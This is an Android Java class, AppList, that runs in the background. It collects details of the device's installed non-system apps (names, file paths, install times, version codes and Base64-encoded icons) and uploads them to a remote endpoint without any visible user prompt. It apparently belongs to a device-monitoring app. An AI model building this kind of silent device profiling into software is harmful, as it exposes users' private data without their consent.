package com.inet.android.list;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.util.Base64;

/**
 * ListApp class is designed to get the list of applications
 * 
 * @author johny homicide
 * 
 */
@SuppressLint("NewApi")
public class AppList extends AsyncTask<Context, Void, Void> {
	private Context mContext;
	private String complete;
	private static String LOG_TAG = AppList.class.getSimpleName().toString();
	private final int COMPRESSION_QUALITY = 100;
	private int version;

	/**
	 * get the list of all installed applications in the device
	 * 
	 * @return ArrayList of installed applications or null
	 */
	@SuppressLint("NewApi")
	public void getListOfInstalledApp(Context context) {
		this.mContext = context;
		version = AppSettings.getSetting(AppConstants.TYPE_LIST_APP, mContext);
	
		Logging.doLog(LOG_TAG, "getListOfInstalledApp", "getListOfInstalledApp");

		Set<Map<String, String>> listOfMapsForData = new HashSet<Map<String, String>>();

		if (NetworkChangeReceiver.isOnline(context) != 0) {
			int flags = PackageManager.GET_META_DATA | PackageManager.GET_SHARED_LIBRARY_FILES
					| PackageManager.GET_UNINSTALLED_PACKAGES;
			PackageManager packageManager = context.getPackageManager();
			final List<ApplicationInfo> installedApps = packageManager.getInstalledApplications(flags);

			for (ApplicationInfo app : installedApps) {
				if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
					// System application

				} else {
					try {
						Logging.doLog(LOG_TAG, "ApplicationInfo", "ApplicationInfo");
						PackageInfo packageInfo = packageManager.getPackageInfo(app.packageName,
								PackageManager.GET_PERMISSIONS);
						SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
						Map<String, String> data = new HashMap<String, String>();

						String installTime = dateFormat.format(new Date(packageInfo.firstInstallTime));
						// -----------get Icon
						// App-------------------------------------
						Drawable icon = packageInfo.applicationInfo.loadIcon(context.getPackageManager());
						Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();
						if (bitmap != null) {
							ByteArrayOutputStream byteArrayBitmapStream = new ByteArrayOutputStream();
							bitmap.compress(Bitmap.CompressFormat.PNG, COMPRESSION_QUALITY, byteArrayBitmapStream);
							data.put("icon",
									Base64.encodeToString(byteArrayBitmapStream.toByteArray(), Base64.DEFAULT));

						}
						// ------------------------------------------------------
						// Send Data
						// ------------------------------------------------------

						data.put("dir", app.sourceDir);
						data.put("name", app.loadLabel(packageManager).toString());
						data.put("time", installTime);
						data.put("build", Integer.toString(packageInfo.versionCode));
						listOfMapsForData.add(data);

					} catch (PackageManager.NameNotFoundException e) {
						e.printStackTrace();

					}
				}
			}
			if (listOfMapsForData.isEmpty() != true) {
				sendRequest(listOfMapsForData);
				listOfMapsForData = null;
			} else {
				sendRequest("");
			}
		} else {
			Queue.setList(AppConstants.TYPE_LIST_APP, version, "0", mContext);
		}
	}

	private void sendRequest(Object request) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 .." + version, "Send complete 1 .." + version);
		RequestList.sendDemandRequest(request, AppConstants.TYPE_LIST_APP_REQUEST, complete, version, mContext);	
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Auto-generated method stub
		getListOfInstalledApp(params[0]);
		return null;
	}

}